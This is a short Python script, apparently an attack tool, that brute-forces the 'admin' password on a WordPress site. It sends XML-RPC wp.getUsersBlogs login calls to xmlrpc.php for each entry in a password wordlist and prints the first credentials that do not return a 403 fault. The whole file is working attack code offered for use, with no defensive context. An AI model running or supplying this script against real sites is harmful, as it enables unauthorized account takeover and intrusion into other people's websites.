from bs4 import BeautifulSoup
import requests, sys

target = sys.argv[1]
user = 'admin'
passwords = sys.argv[2]

class brute:
    def __init__(self,url):
        self.url = url
    def req(self,d):
        resp = requests.post(self.url, data=data)
        return resp.text
    def beaut(self,resp):
        soup = BeautifulSoup(resp,features='xml')
        resp = soup.find(string='403')
        #print(soup.prettify())
        return resp
if __name__ == '__main__':
    url = f"http://{target}/xmlrpc.php"
    wp_brute = brute(url)
    with open(passwords, 'r',encoding='latin1') as file:
        file = file.readlines() 
        for password in file:
            password = password.strip()
            data = f"<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{user}</value></param><param><value>{password}</value></param></params></methodCall>"
            resp = wp_brute.req(data)
            validation = wp_brute.beaut(resp)
            #print(validation)
            if validation != '403':
                print(f'Username: {user}\nPassword: {password}')
                break
            else:
                continue
    
    
